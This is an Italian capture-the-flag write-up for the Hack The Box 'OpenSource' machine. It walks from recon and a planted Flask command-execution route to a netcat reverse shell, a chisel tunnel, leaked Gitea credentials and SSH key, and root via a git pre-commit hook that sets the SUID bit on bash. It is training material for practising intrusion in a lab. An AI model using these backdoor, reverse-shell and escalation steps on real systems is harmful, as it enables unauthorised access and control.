# OpenSource
* **POINTS**: 20
* **USER RATING**: Easy
* **OPERATING SYSTEM**: Linux
* **RATING**: 4.5

## 1. Recon
```console
└─$ nmap -sC -sV -oA nmap/initial 10.10.11.164                                                                     
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-17 12:53 EDT
Nmap scan report for 10.10.11.164
Host is up (0.13s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3
|_http-title: upcloud - Upload files for Free!
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Fri, 17 Jun 2022 16:54:16 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 5316
|     Connection: close
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>upcloud - Upload files for Free!</title>
|     <script src="/static/vendor/jquery/jquery-3.4.1.min.js"></script>
|     <script src="/static/vendor/popper/popper.min.js"></script>
|     <script src="/static/vendor/bootstrap/js/bootstrap.min.js"></script>
|     <script src="/static/js/ie10-viewport-bug-workaround.js"></script>
|     <link rel="stylesheet" href="/static/vendor/bootstrap/css/bootstrap.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-grid.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-reboot.css"/>
|     <link rel=
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Fri, 17 Jun 2022 16:54:16 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, OPTIONS, GET
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
3000/tcp filtered ppp
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.92%I=7%D=6/17%Time=62ACB1B4%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,1573,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.1\.2\x20P
SF:ython/3\.10\.3\r\nDate:\x20Fri,\x2017\x20Jun\x202022\x2016:54:16\x20GMT
SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20
SF:5316\r\nConnection:\x20close\r\n\r\n<html\x20lang=\"en\">\n<head>\n\x20
SF:\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=
SF:\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\.0\">\
SF:n\x20\x20\x20\x20<title>upcloud\x20-\x20Upload\x20files\x20for\x20Free!
SF:</title>\n\n\x20\x20\x20\x20<script\x20src=\"/static/vendor/jquery/jque
SF:ry-3\.4\.1\.min\.js\"></script>\n\x20\x20\x20\x20<script\x20src=\"/stat
SF:ic/vendor/popper/popper\.min\.js\"></script>\n\n\x20\x20\x20\x20<script
SF:\x20src=\"/static/vendor/bootstrap/js/bootstrap\.min\.js\"></script>\n\
SF:x20\x20\x20\x20<script\x20src=\"/static/js/ie10-viewport-bug-workaround
SF:\.js\"></script>\n\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href
SF:=\"/static/vendor/bootstrap/css/bootstrap\.css\"/>\n\x20\x20\x20\x20<li
SF:nk\x20rel=\"stylesheet\"\x20href=\"\x20/static/vendor/bootstrap/css/boo
SF:tstrap-grid\.css\"/>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20hr
SF:ef=\"\x20/static/vendor/bootstrap/css/bootstrap-reboot\.css\"/>\n\n\x20
SF:\x20\x20\x20<link\x20rel=")%r(HTTPOptions,C7,"HTTP/1\.1\x20200\x20OK\r\
SF:nServer:\x20Werkzeug/2\.1\.2\x20Python/3\.10\.3\r\nDate:\x20Fri,\x2017\
SF:x20Jun\x202022\x2016:54:16\x20GMT\r\nContent-Type:\x20text/html;\x20cha
SF:rset=utf-8\r\nAllow:\x20HEAD,\x20OPTIONS,\x20GET\r\nContent-Length:\x20
SF:0\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTM
SF:L\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x
SF:20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equ
SF:iv=\"Content-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x
SF:20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x2
SF:0</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>E
SF:rror\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code
SF::\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20req
SF:uest\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20
SF:Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20
SF:\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.10 seconds
```

### 1.1 Risultati nmap
#
Sulla porta 80 c'è un server python che gira ed è un sito web 

![sito](Images/web.png)

Scorrendo in basso possiamo andare a scaricare il sorgente

![download](Images/download.png)

## 2. Analisi sorgente
In `utils.py` si denota un metodo che funge da WAF affinchè non possiamo caricare file dove vogliamo:

```python
def get_unique_upload_name(unsafe_filename):
    spl = unsafe_filename.rsplit("\\.", 1)
    file_name = spl[0]
    file_extension = spl[1]
    return recursive_replace(file_name, "../", "") + "_" + str(current_milli_time()) + "." + file_extension
```

In `views.py` abbiamo il punto di aggancio poichè possiamo pensare di sovrascriverlo con una richiesta di *POST* nella quale aggiungiamo un endpoint con il quale andiamo a effettuare l'exec:

```python
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))

@app.route('/exec')
def cmd():
    try:
        return os.system(request.args.get("cmd"))
    except:
        return "Exit"
```

Quindi intercettiamo la richiesta di upload con *burp* e la modifichiamo inserendo la destinazione ed il contenuto ed inviamo la richiesta

<p align="center">
  <img src="Images/burp.png" />
</p>

## 3. Shell to container
Prima di ogni cosa dobbiamo capire se funziona correttamente il tutto. Per far ciò lanciamo un ping dalla macchina verso noi

![prova](Images/prova.png)

Arrivati a questo punto prepariamo la reverse shell su [revershell.com](https://www.revshells.com/) e facciamo l'encode

```console
└─$ python3 -c "from urllib.parse import quote; print(quote('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.6 9001 >/tmp/f'))"
rm%20/tmp/f%3Bmkfifo%20/tmp/f%3Bcat%20/tmp/f%7Csh%20-i%202%3E%261%7Cnc%2010.10.14.6%209001%20%3E/tmp/f
```

Quindi lo inseriamo nel sito ed abbiamo la shell !

Per capire che siamo nel container andiamo a fare un pò di enumerazione

```console
/app # arp
? (172.17.0.2) at 02:42:ac:11:00:02 [ether]  on eth0
? (172.17.0.1) at 02:42:a6:04:9a:c7 [ether]  on eth0
```

```console
/app # route
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         172.17.0.1      0.0.0.0         UG    0      0        0 eth0
172.17.0.0      *               255.255.0.0     U     0      0        0 eth0
```

```console
/app # netstat -anp
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      6/python
tcp        1      0 172.17.0.8:80           10.10.14.6:59012        CLOSE_WAIT  28147/python
tcp        0     54 172.17.0.8:35941        10.10.14.6:9001         ESTABLISHED 16067/nc
tcp        0      0 172.17.0.8:80           10.10.14.6:59034        ESTABLISHED 28147/python
tcp        0      0 172.17.0.8:41144        10.10.14.6:9001         CLOSE_WAIT  29142/python3
netstat: /proc/net/tcp6: No such file or directory
netstat: /proc/net/udp6: No such file or directory
netstat: /proc/net/raw6: No such file or directory
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node PID/Program name    Path
```

```console
/app # ifconfig
eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:08  
          inet addr:172.17.0.8  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:635869 errors:0 dropped:0 overruns:0 frame:0
          TX packets:634662 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:49058376 (46.7 MiB)  TX bytes:93894938 (89.5 MiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
```

Quindi l'IP del container dove siamo è `172.17.0.8`, mentre l'IP dell'host è 172.17.0.1 che è probabilmente l'IP del box principale.

## 4. Port Enumeration
Dai risultati iniziali di *nmap* vediamo che ci sono sostanzialmente 3 porte; per capire se c'è ne sono altre e confermare quelle che sappiamo, eseguiamo il seguente comando:

```console
/app # i=1;max=65535;while [ $i -lt $max ];do nc -w 1 -v 172.17.0.1 $i </dev/null;true $(( i++ ));done
172.17.0.1 (172.17.0.1:22) open
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7
172.17.0.1 (172.17.0.1:80) open
172.17.0.1 (172.17.0.1:3000) open
172.17.0.1 (172.17.0.1:6000) open
172.17.0.1 (172.17.0.1:6001) open
172.17.0.1 (172.17.0.1:6002) open
172.17.0.1 (172.17.0.1:6003) open
```

Una volta confermate le porte vediamo cosa restituisce dapprima la porta *80*

```console
/app # wget 172.17.0.1:80
Connecting to 172.17.0.1:80 (172.17.0.1:80)
saving to 'index.html'
index.html           100% |********************************|  5316  0:00:00 ETA
'index.html' saved

/app # head index.* 
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>upcloud - Upload files for Free!</title>

    <script src="/static/vendor/jquery/jquery-3.4.1.min.js"></script>
    <script src="/static/vendor/popper/popper.min.js"></script>

    <script src="/static/vendor/bootstrap/js/bootstrap.min.js"></script>
```

quindi la porta *3000* (che dall'analisi di nmap risulta *filtered*)

```console
/app # wget 172.17.0.1:3000
Connecting to 172.17.0.1:3000 (172.17.0.1:3000)
saving to 'index.html'
index.html           100% |********************************| 13414  0:00:00 ETA
'index.html' saved

/app # head index*
<!DOCTYPE html>
<html lang="en-US" class="theme-">
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title> Gitea: Git with a cup of tea</title>
        <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL29wZW5zb3VyY2UuaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9vcGVuc291cmNlLmh0YjozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ4NTEyIn0seyJzcmMiOiJodHRwOi8vb3BlbnNvdXJjZS5odGI6MzAwMC9hc3NldHMvaW1nL2xvZ28uc3ZnIiwidHlwZSI6ImltYWdlL3N2Zyt4bWwiLCJzaXplcyI6IjUxMng1MTIifV19"/>
        <meta name="theme-color" content="#6cc644">
        <meta name="default-theme" content="auto" />
        <meta name="author" content="Gitea - Git with a cup of tea" />
```

e notiamo che ci da l'accesso a [Gitea](https://github.com/go-gitea/gitea) (dove la porta di default è la 3000).

## 5. Chisel
Non possiamo comunicare direttamente con Gitea, quindi utilizziamo [Chisel](https://github.com/jpillora/chisel) per avere un reverse proxy.

Avviamo chisel in modalità *server* e *reverse* sulla nostra macchina 

```console
└─$ ./chisel server --reverse --port 5000
2022/06/21 11:26:34 server: Reverse tunnelling enabled
2022/06/21 11:26:34 server: Fingerprint PENGlXUiWNNyqswr45xhLj+EWTeBL7gaZtx+GzKY0yk=
2022/06/21 11:26:34 server: Listening on http://0.0.0.0:5000
2022/06/21 11:27:14 server: session#1: tun: proxy#R:3000=>172.17.0.1:3000: Listening
```

e in modalità *client* nel container aggiungendo l'opzione *R:3000:172.17.0.1:3000* per avere 

```console
/tmp # ./chisel client 10.10.14.4:5000 R:3000:172.17.0.1:3000    
2022/06/21 15:27:14 client: Connecting to ws://10.10.14.4:5000
2022/06/21 15:27:15 client: Connected (Latency 129.07158ms)
```

## 6. Gitea
Inserendo nel browser *localhost:3000* abbiamo il sito

![gitea](Images/gitea.png)

Per entrare abbiamo bisogno delle credenziali, che iniziamo a cercare nel source.

Vediamo prima i branch

```console
└─$ git branch 
  dev
* public
```

Quindi i log del branch *dev*

```console
└─$ git log dev
commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 (dev)
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:47:24 2022 +0200

    ease testing

commit be4da71987bbbc8fae7c961fb2de01ebd0be1997
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:54 2022 +0200

    added gitignore

commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:16 2022 +0200

    updated

commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:45:17 2022 +0200

    initial
```

Interessante è la commit *updated"

```console
└─$ git show a76f8f75f7a4a12b706b0cf9c983796fa1985820
commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:16 2022 +0200

    updated

diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json
new file mode 100644
index 0000000..5975e3f
--- /dev/null                                                                                                      
+++ b/app/.vscode/settings.json                                                                                    
@@ -0,0 +1,5 @@                                                                                                    
+{                                                                                                                 
+  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",                                  
+  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",                                        
+  "http.proxyStrictSSL": false                                                                                    
+}                                                                                                                 
diff --git a/app/app/views.py b/app/app/views.py                                                                   
index f2744c6..0f3cc37 100644                                                                                      
--- a/app/app/views.py                                                                                             
+++ b/app/app/views.py                                                                                             
@@ -6,7 +6,17 @@ from flask import render_template, request, send_file                                             
 from app import app                                                                                               
 
 
-@app.route('/', methods=['GET', 'POST'])
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+
+@app.route('/download')
+def download():
+    return send_file(os.path.join(os.getcwd(), "app", "static", "source.zip"))
+
+
+@app.route('/upcloud', methods=['GET', 'POST'])
 def upload_file():
     if request.method == 'POST':
         f = request.files['file']
@@ -20,4 +30,4 @@ def upload_file():
 @app.route('/uploads/<path:path>')
 def send_report(path):
     path = get_file_name(path)
-    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
\ No newline at end of file
+    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
```

Abbiamo le credenziali `dev01:Soulless_Developer#2022`

## 7. SSH
Entrati con le credenziali di cui sopra vediamo la seguente dashboard

![dash](Images/dshbord.png)

Quindi vediamo il branch main

<p align="center">
  <img src="Images/home-backup.png" />
</p>

Interessante è la directory *ssh*

<p align="center">
  <img src="Images/ssh.png" />
</p>

Abbiamo la chiave ssh, quindi la scarichiamo, cambiamo i permessi (`chmod 600 id_rsa`) ed accediamo al servizio ssh

```console
─$ ssh -i id_rsa dev01@10.10.11.164                                                                     
The authenticity of host '10.10.11.164 (10.10.11.164)' can't be established.
ED25519 key fingerprint is SHA256:LbyqaUq6KgLagQJpfh7gPPdQG/iA2K4KjYGj0k9BMXk.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.164' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-176-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Jun 21 16:13:16 UTC 2022

  System load:  0.06              Processes:              219
  Usage of /:   75.6% of 3.48GB   Users logged in:        0
  Memory usage: 22%               IP address for eth0:    10.10.11.164
  Swap usage:   0%                IP address for docker0: 172.17.0.1


16 updates can be applied immediately.
9 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


Last login: Mon May 16 13:13:33 2022 from 10.10.14.23
dev01@opensource:~$
```

Ed abbiamo la *user* flag: `c1e7a1bea0dc3f70ea37c7e972b7a5e2`

## 8. Privilege Escalation
Dopo un pò di enumeration, interessante è il risultato di [pspy](https://github.com/DominicBreuker/pspy)

```
<SNIP>

2022/06/21 16:20:03 CMD: UID=0    PID=21158  | /bin/bash /root/meta/app/clean.sh 
2022/06/21 16:20:03 CMD: UID=0    PID=21157  | /bin/bash /root/meta/app/clean.sh 
2022/06/21 16:21:01 CMD: UID=0    PID=21176  | git status --porcelain 
2022/06/21 16:21:01 CMD: UID=0    PID=21175  | /bin/bash /usr/local/bin/git-sync 
2022/06/21 16:21:01 CMD: UID=0    PID=21174  | /bin/sh -c /usr/local/bin/git-sync 
2022/06/21 16:21:01 CMD: UID=0    PID=21173  | /usr/sbin/CRON -f 
2022/06/21 16:21:01 CMD: UID=0    PID=21178  | git add . 
2022/06/21 16:21:01 CMD: UID=0    PID=21179  | git commit -m Backup for 2022-06-21 
2022/06/21 16:21:01 CMD: UID=0    PID=21180  | git push origin main 
2022/06/21 16:21:01 CMD: UID=0    PID=21181  | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git 

<SNIP>
```

Dal codice soprastante si evince un cron job che fa una commit ogni minuto.

Cercando su Google qualche articolo che mi potesse essere utile, mi sono imbattuto in [questo](https://gtfobins.github.io/gtfobins/git/) in cui spiega come, grazie a *.git/hooks/pre-commit*, si può eseguire del codice come *root*.

Sfruttando tale info, andiamo a creare il file *.git/hooks/pre-commit* inserendo al suo interno: `chmod 4755 /bin/bash` affinchè, nel momento in cui viene eseguito, abbiamo la possibilità di diventare root con `bash -p`.

```console
dev01@opensource:~/.git/hooks$ nano ~/.git/hooks/pre-commit
dev01@opensource:~/.git/hooks$ chmod +x pre-commit
```

Quindi lanciamo il comando `watch -n1 ls -l /bin/bash` per monitorare i permessi del binario.

Dopo di che lanciamo il comanda¡o `bash -p` e siamo root.

In */root* abbiamo la flag: `3559f051eb362e778756e67c2c54e162`